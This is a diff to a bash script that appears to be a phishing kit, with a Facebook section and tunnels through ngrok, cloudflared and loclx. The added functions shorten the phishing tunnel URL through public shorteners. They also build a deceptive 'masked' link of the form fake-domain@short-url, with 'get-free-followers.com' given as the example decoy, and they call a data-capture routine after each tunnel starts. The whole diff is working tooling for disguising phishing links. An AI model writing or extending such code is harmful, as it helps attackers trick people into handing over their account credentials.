@@ -486,6 +486,8 @@ start_ngrok() {
 
 	sleep 8
 	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -Eo '(https)://[^/"]+(.ngrok.io)')
+	custom_url "$ngrok_url"
+	capture_data
 
 	# ngrok_url1=${ngrok_url#https://}
 	# echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$ngrok_url"
@@ -508,8 +510,9 @@ start_cloudflared() {
 	fi
 
 	sleep 8
-	
 	cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log")
+	custom_url "$cldflr_url"
+	capture_data
 
 	# cldflr_link1=${cldflr_link#https://}
 	# echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$cldflr_link"
@@ -550,8 +553,10 @@ start_loclx() {
 		sleep 1 && ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
 	fi
 
-	sleep 10
+	sleep 12
 	loclx_url=$(cat .server/.loclx | grep -o '[0-9a-zA-Z.]*.loclx.io')
+	custom_url "$loclx_url"
+	capture_data
 
 	# echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}http://$loclx_url"
 	# echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$loclx_url"
@@ -595,6 +600,64 @@ tunnel_menu() {
 			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
 			{ sleep 1; tunnel_menu; };;
 	esac
+}
+
+## Custom Mask URL
+custom_mask() {
+    echo
+    read -n1 -p "Do you want to change Mask URL? [y/N] : " mask_op
+    echo
+    if [[ ${mask_op,,} == "y" ]]; then
+        echo -e "\nEnter Your custom url below (example: https://get-free-followers.com)\n"
+        read -e -p "=> " -i "https://" mask_url # initial text requires Bash 4+
+        if [[ ${mask_url//:*} =~ (www|https?) ]]; then # Someone fix this. Exclude (;,:!#$%^& etc). I suck at regex
+            mask=$mask_url
+            echo -e "\nUsing custom Masked Url : $mask"
+        else
+            echo -e "\nInvalid url type..Using the Default one.."
+        fi
+    fi
+}
+
+## URL Shortner
+site_stat() { [[ ${1} != "" ]] && curl -s -o "/dev/null" -w "%{http_code}" "${1}https://github.com"; }
+
+shorten() {
+    short=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-delay 2 "$1$2")
+    if [[ "$1" == *"shrtco.de"* ]]; then
+        processed_url=$(echo ${short} | sed 's/\\//g' | grep -o '"short_link2":"[a-zA-Z0-9./-]*' | awk -F\" '{print $4}')
+    else
+        # processed_url=$(echo "$short" | awk -F// '{print $NF}')
+        processed_url=${short#http*//}
+    fi     
+}
+
+custom_url() {
+    url=${1#http*//}
+    isgd="https://is.gd/create.php?format=simple&url="
+    shortcode="https://api.shrtco.de/v2/shorten?url="
+    tinyurl="https://tinyurl.com/api-create.php?url="
+
+    if [[ ${url} =~ [-a-zA-Z0-9.]*(ngrok.io|trycloudflare.com|loclx.io) ]]; then
+        if [[ $(site_stat $isgd) == 2* ]]; then
+            shorten $isgd "$url"
+        elif [[ $(site_stat $shortcode) == 2* ]]; then
+            shorten $shortcode "$url"
+        else
+            shorten $tinyurl "$url"
+        fi
+
+        { custom_mask; sleep 1; clear; banner_small; }
+        url="https://$url"
+        masked_url="$mask@$processed_url"
+        processed_url="https://$processed_url"
+    else
+        # echo "[!] No url provided / Regex Not Matched"
+        url="Unable to generate links. Try after turning on hotspot"
+        processed_url="Unable to Short URL"
+    fi
+    echo -e "\nUrl 1: $url\nUrl 2: $processed_url"
+    [[ $processed_url != *"Unable"* ]] && echo "Url 3: $masked_url"
 }
 
 ## Facebook
